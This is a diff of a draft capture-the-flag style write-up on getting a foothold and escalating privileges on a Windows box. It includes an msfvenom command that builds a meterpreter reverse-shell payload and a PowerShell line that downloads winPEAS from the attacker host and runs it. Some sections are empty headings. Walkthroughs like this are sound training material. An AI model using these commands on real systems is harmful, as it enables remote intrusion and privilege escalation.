@@ -277,11 +277,27 @@ Since we are in the `C:\Windows\system32` directory, we cannot make changes here
 
 We can change to `C:\Users\Public` directory for downloading shells and privilege escalation executable.  Since there is no persistence we will have to use the `cd` command chained with other commands.
 
-### Privilege Escalation
+### Foot holding
 
-Now that we have&#x20;
+Now that we can execute any arbitrary commands on the victim machine, we can get a firmer foothold on the victim server, aka, a reverse shell access. We can do this in two ways:
 
-### Using metasploit
+### Using metasploit and python HTTP server
+
+Spin up an `msfvenom` payload using:
+
+```awk
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o payload.exe
+```
+
+Start python HTTP server using:
+
+```
+python3 -m http.server 8000
+```
+
+
+
+
 
 ### Using net/powercat reverse shell and python HTTP server
 
@@ -324,13 +340,25 @@ cd Administrator
 Access is denied.
 ```
 
-So we need to perform privilege escalation. We use `winpeas` for this. After changing to `powershell`, we can use:
+So we need to perform privilege escalation.&#x20;
+
+### Vulnerability and CVE scanning with winpeas
+
+We can use `winpeas` to find vulnerabilities or leaked credentials that can help us in privilege escalation.&#x20;
+
+#### Using meterpreter reverse shell
+
+#### Using powercat reverse shell
+
+After changing to `powershell`, we can use:
 
 ```powershell
 wget http://10.10.14.28:8000/winPEASx64.exe -o winPEASx64.exe; .\winPEASx64.exe
 ```
 
-Winpeas gives us some critical vulnetrabilities:
+To get winpeas.exe from the attacker machine onto the victim machine.&#x20;
+
+Winpeas gives us some critical vulnerabilities:
 
 ```
 [!] CVE-2019-0836 : VULNERABLE
